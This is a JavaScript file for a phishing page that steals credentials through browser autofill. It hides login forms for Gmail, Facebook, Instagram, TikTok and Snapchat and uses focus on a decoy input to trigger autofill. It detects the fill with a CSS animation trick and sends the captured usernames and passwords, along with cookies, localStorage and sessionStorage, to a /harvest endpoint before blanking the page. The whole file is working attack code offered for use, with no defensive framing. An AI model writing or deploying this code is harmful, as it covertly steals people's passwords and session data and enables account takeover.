// A flag to prevent multiple harvests
window.harvested = false;

async function harvest() {
  // Check the flag to ensure this function only runs once
  if (window.harvested) return;
  window.harvested = true;

  // A short delay to ensure all autofill values are populated
  await new Promise(resolve => setTimeout(resolve, 50));

  const gmailForm = document.getElementById('gmail-form');
  const facebookForm = document.getElementById('facebook-form');
  const instagramForm = document.getElementById('instagram-form');
  const tiktokForm = document.getElementById('tiktok-form');
  const snapchatForm = document.getElementById('snapchat-form');

  const data = {
    gmail: {
      email: gmailForm ? gmailForm.email.value : '',
      password: gmailForm ? gmailForm.password.value : '',
    },
    facebook: {
      username: facebookForm ? facebookForm.username.value : '',
      password: facebookForm ? facebookForm.password.value : '',
    },
    instagram: {
      username: instagramForm ? instagramForm.username.value : '',
      password: instagramForm ? instagramForm.password.value : '',
    },
    tiktok: {
      username: tiktokForm ? tiktokForm.username.value : '',
      password: tiktokForm ? tiktokForm.password.value : '',
    },
    snapchat: {
      username: snapchatForm ? snapchatForm.username.value : '',
      password: snapchatForm ? snapchatForm.password.value : '',
    },
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
  };

  try {
    // Use sendBeacon for a more reliable unload harvest
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Beacon harvest sent.');
    } else {
      // Fallback to fetch for other cases
      const response = await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Harvest successful:', response.status);
    }
  } catch (error) {
    console.error('Harvest failed:', error);
  }

  // Redirect after a short delay
  setTimeout(() => {
    window.location.href = 'about:blank';
  }, 500);
}

// --- Autofill Detection using CSS Animation Trick ---
const style = document.createElement('style');
style.innerHTML = `
  @keyframes onAutoFillStart { from {} to {} }
  input:-webkit-autofill {
    animation-name: onAutoFillStart;
    animation-fill-mode: both;
  }
`;
document.head.appendChild(style);

document.addEventListener('animationstart', (e) => {
  if (e.animationName === 'onAutoFillStart') {
    // Use a small delay to ensure all fields in the form are filled
    setTimeout(harvest, 50);
  }
}, true);

// --- Fallback Mechanisms ---
// The primary mechanism is now the animation detection. The unload listener is a fallback.
window.addEventListener('beforeunload', harvest);

// --- UI & Focus Trap Logic ---

// After a delay, hide the loader and show the honeypot prompt
setTimeout(() => {
  const previewContainer = document.querySelector('.preview-container');
  const honeypotContainer = document.querySelector('.honeypot-container');
  if (previewContainer) previewContainer.style.display = 'none';
  if (honeypotContainer) honeypotContainer.style.display = 'block';
}, 1500);

function triggerFocusSwarm() {
  console.log('Honeypot focused, attempting to trigger focus swarm...');

  const forms = document.querySelectorAll('.hidden-form');
  
  // Temporarily make forms visible to allow focus
  forms.forEach(form => {
    form.style.display = 'block';
    form.style.opacity = '0';
    form.style.position = 'absolute';
  });

  // Focus all the username/email fields
  document.querySelector('#gmail-form input[name="email"]')?.focus();
  document.querySelector('#facebook-form input[name="username"]')?.focus();
  document.querySelector('#instagram-form input[name="username"]')?.focus();
  document.querySelector('#tiktok-form input[name="username"]')?.focus();
  document.querySelector('#snapchat-form input[name="username"]')?.focus();

  // Hide the forms again shortly after. The harvest is now triggered by the animation event.
  setTimeout(() => {
      forms.forEach(form => {
          form.style.display = 'none';
      });
  }, 100);
}

// Add a one-time event listener to the honeypot input for the 'focus' event.
const honeypotInput = document.getElementById('honeypot-input');
if (honeypotInput) {
  honeypotInput.addEventListener('focus', triggerFocusSwarm, { once: true });
}